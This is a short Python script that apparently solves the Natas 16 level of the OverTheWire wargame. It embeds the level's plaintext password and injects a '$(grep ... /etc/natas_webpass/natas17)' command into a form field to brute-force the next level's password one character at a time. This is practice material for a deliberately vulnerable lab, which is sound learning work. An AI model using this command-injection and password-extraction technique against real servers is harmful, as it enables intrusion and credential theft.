import requests
import re
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = "natas16"
password = "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"

url = 'http://%s.natas.labs.overthewire.org/' %username

#session = requests.Session()
#response = session.get(url, auth=(username, password))
#response = session.post(url, data= {"needle":"anythings$(grep ^b /etc/natas_webpass/natas17)"}, auth=(username, password))
#content = response.text

seen_password = ""
while len(seen_password) < 32:
    for character in characters:
        print (f"{seen_password}{character}")
        response = requests.post(url, data= {"needle":f"anythings$(grep ^{seen_password}{character} /etc/natas_webpass/natas17)"}, auth=(username, password))
        content = response.text

        returned = re.findall('<pre>\n(.*)\n</pre>', content)

        if (not returned):
            seen_password+=character
            break
#print(content)
